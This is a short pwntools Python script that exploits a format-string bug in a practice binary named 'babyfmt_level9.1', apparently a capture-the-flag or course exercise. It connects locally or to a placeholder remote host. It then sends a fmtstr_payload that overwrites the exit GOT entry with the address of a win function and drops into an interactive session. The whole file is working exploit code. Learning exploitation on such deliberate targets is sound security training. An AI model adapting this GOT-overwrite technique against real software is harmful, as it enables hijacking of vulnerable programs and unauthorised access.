#!/usr/bin/env python3

from pwn import *

exe = ELF("./babyfmt_level9.1")

context.binary = exe
gdb_script = """
b *main+123
c
"""


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.GDB:
            gdb.attach(r,gdb_script)
    else:
        r = remote("addr", 1337)

    return r


win_addr = 0x4012fd
exit_got = 0x404078
offset = 24
def main():
    r = conn()

    # good luck pwning :)
    payload = b'A' * 5
    payload += fmtstr_payload(offset, {exit_got: win_addr}, write_size='short', numbwritten=96)
    r.send(payload)
    r.interactive()


if __name__ == "__main__":
    main()




# allready printed bytes = 91
